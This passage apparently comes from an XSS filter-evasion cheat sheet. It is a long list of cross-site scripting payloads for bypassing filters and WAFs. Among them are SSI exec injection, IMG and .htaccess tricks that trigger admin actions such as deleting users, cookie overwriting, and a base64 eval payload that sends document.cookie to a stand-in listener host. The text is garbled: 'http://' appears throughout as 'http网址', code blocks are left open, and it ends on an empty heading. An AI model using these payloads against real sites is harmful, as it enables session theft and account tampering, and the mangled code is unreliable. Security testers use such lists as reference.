This is how Grey Magic hacked Hotmail and Yahoo!. This only works in Internet Explorer and Netscape 8.1 in IE rendering engine mode and remember that you need to be between HTML and BODY tags for this to work:

```js
<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">

<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
</BODY></HTML>
Assuming you can only fit in a few characters and it filters against .js
You can rename your JavaScript file to an image as an XSS vector:
```

```js
<SCRIPT SRC="http网址xss.rocks/xss.jpg"></SCRIPT>
```

## SSI (Server Side Includes)
This requires SSI to be installed on the server to use this XSS vector. I probably don’t need to mention this, but if you can run commands on the server there are no doubt much more serious issues:

<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http网址xss.rocks/xss.js></SCRIPT>'"-->

PHP
Requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts ## remotely like this, there are probably much more dire issues:

```
<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>
```

IMG Embedded Commands
This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc…. This is one of the lesser used but more useful XSS vectors:

```js
<IMG SRC="http网址www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
```

IMG Embedded Commands part II
This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal <IMG SRC="httx://badguy.com/a.jpg"> could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this):
```
Redirect 302 /a.jpg http网址victimsite.com/admin.asp&deleteuser
```
Cookie Manipulation
Admittedly this is pretty obscure but I have seen a few examples where <META is allowed and you can use it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim’s cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc…):

```js
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
```

UTF-7 Encoding
If the page that the XSS resides on doesn’t provide a page charset header, or any browser that is set to UTF-7 encoding can be exploited with the following (Thanks to Roman Ivanov for this one). Click here for an example (you don’t need the charset statement if the user’s browser is set to auto-detect and there is no overriding content-types on the page in Internet Explorer and Netscape 8.1 in IE rendering engine mode). This does not work in any modern browser without changing the encoding type which is why it is marked as completely unsupported. Watchfire found this hole in Google’s custom 404 script.:

```js
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-

```
XSS Using HTML Quote Encapsulation
This was tested in IE, your mileage may vary. For performing XSS on sites that allow <SCRIPT> but don’t allow <SCRIPT SRC... by way of a regex filter /\<script\[^\>\]+src/i:

```js
<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

For performing XSS on sites that allow <SCRIPT> but don’t allow \<script src... by way of a regex filter /\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i (this is an important one, because I’ve seen this regex in the wild):

```js
<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

Another XSS to evade the same filter, /\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i:

```js
<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

Yet another XSS to evade the same filter, /\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i. I know I said I wasn’t goint to discuss mitigation techniques but the only thing I’ve seen work for this XSS example if you still want to allow <SCRIPT> tags but not remote script is a state machine (and of course there are other ways to get around this if they allow <SCRIPT> tags):

```js
<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

And one last XSS attack to evade, /\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i using grave accents (again, doesn’t work in Firefox):

```js
<SCRIPT a=> SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

Here’s an XSS example that bets on the fact that the regex won’t catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly:

```js
<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content:

```js
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

URL String Evasion
Assuming http网址www.google.com/ is programmatically disallowed:

IP Versus Hostname

```js
<A HREF="http网址66.102.7.147/">XSS</A>
```

URL Encoding

```js
<A HREF="http网址%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
```

DWORD Encoding
Note: there are other of variations of Dword encoding - see the IP Obfuscation calculator below for more details:

```js
<A HREF="http网址1113982867/">XSS</A>
```

Hex Encoding
The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quotet is not required):

```js
<A HREF="http网址0x42.0x0000066.0x7.0x93/">XSS</A>
```

Octal Encoding
Again padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc…:

```js
<A HREF="http网址0102.0146.0007.00000223/">XSS</A>
```

Base64 Encoding

```js
<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
```

Mixed Encoding
Let’s mix and match base encoding and throw in some tabs and newlines - why browsers allow this, I’ll never know). The tabs and newlines only work if this is encapsulated with quotes:

```js
<A HREF="h
tt  p://6	6.000146.0x7.147/">XSS</A>

Protocol Resolution Bypass
// translates to http网址 which saves a few more bytes. This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like (ht|f)tp(s)?:// (thanks to Ozh for part of this one). You can also change the // to \\\\. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL.

<A HREF="//www.google.com/">XSS</A>
```
Google “feeling lucky” part 1.
Firefox uses Google’s “feeling lucky” function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox’s keyword: protocol. You can concatenate several keywords by using something like the following keyword:XSS+RSnake for instance. This no longer works within Firefox as of 2.0.

```js
<A HREF="//google">XSS</A>
```

Google “feeling lucky” part 2.
This uses a very tiny trick that appears to work Firefox only, because of it’s implementation of the “feeling lucky” function. Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not. It’s simply a malformed URL. If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera, and it is no longer supported in Firefox as of 2.0:

```js
<A HREF="http网址ha.ckers.org@google">XSS</A>
```

Google “feeling lucky” part 3.
This uses a malformed URL that appears to work in Firefox and Opera only, because if their implementation of the “feeling lucky” function. Like all of the above it requires that you are #1 in Google for the keyword in question (in this case “google”):

```js
<A HREF="http网址google:ha.ckers.org">XSS</A>
```

Removing CNAMEs
When combined with the above URL, removing www. will save an additional 4 bytes for a total byte savings of 9 for servers that have this set up properly):

```js
<A HREF="http网址google.com/">XSS</A>
```

Extra dot for absolute DNS:

```js
<A HREF="http网址www.google.com./">XSS</A>
```

JavaScript Link Location:

```js
<A HREF="javascript:document.location='http网址www.google.com/'">XSS</A>
```

Content Replace as Attack Vector
Assuming http网址www.google.com/ is programmatically replaced with nothing). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector (IE: java&\#x09;script: was converted into java	script:, which renders in IE, Netscape 8.1+ in secure site mode and Opera):

```js
<A HREF="http网址www.google.com/ogle.com/">XSS</A>
```

Assisting XSS with HTTP Parameter Pollution
Assume a content sharing flow on a web site is implemented as below. There is a “Content” page which includes some content provided by users and this page also includes a link to “Share” page which enables a user choose their favorite social sharing platform to share it on. Developers HTML encoded the “title” parameter in the “Content” page to prevent against XSS but for some reasons they didn’t URL encoded this parameter to prevent from HTTP Parameter Pollution. Finally they decide that since content_type’s value is a constant and will always be integer, they didn’t encode or validate the content_type in the “Share” page.

Content Page Source Code
a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>

Share Page Source Code

```js
<script>
var contentType = <%=Request.getParameter("content_type")%>;

var title = "<%=Encode.forJavaScript(request.getParameter("title"))%>";
...
//some user agreement and sending to server logic might be here
...
</script>
```
Content Page Output
In this case if attacker set untrusted content title as “This is a regular title&content_type=1;alert(1)” the link in “Content” page would be this:

```js
<a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>
```

Share Page Output
And in share page output could be this:

```js
<script>
var contentType = 1; alert(1);

var title = "This is a regular title";
…
//some user agreement and sending to server logic might be here
…
</script>
```
As a result, in this example the main flaw is trusting the content_type in the “Share” page without proper encoding or validation. HTTP Parameter Pollution could increase impact of the XSS flaw by promoting it from a reflected XSS to a stored XSS.

Character Escape Sequences
All the possible combinations of the character “<” in HTML and JavaScript. Most of these won’t render out of the box, but many of them can get rendered in certain circumstances as seen above.

```js
<

Methods to Bypass WAF – Cross-Site Scripting
General issues
Stored XSS
If an attacker managed to push XSS through the filter, WAF wouldn’t be able to prevent the attack conduction.

Reflected XSS in Javascript
Example: <script> ... setTimeout(\\"writetitle()\\",$\_GET\[xss\]) ... </script>
Exploitation: /?xss=500); alert(document.cookie);//
DOM-based XSS
Example: <script> ... eval($\_GET\[xss\]); ... </script>
Exploitation: /?xss=document.cookie
XSS via request Redirection
Vulnerable code:
...
header('Location: '.$_GET['param']);
...
As well as:

..
header('Refresh: 0; URL='.$_GET['param']);
...
This request will not pass through the WAF:
/?param=<javascript:alert(document.cookie>)

This request will pass through the WAF and an XSS attack will be conducted in certain browsers.
/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=

WAF ByPass Strings for XSS.
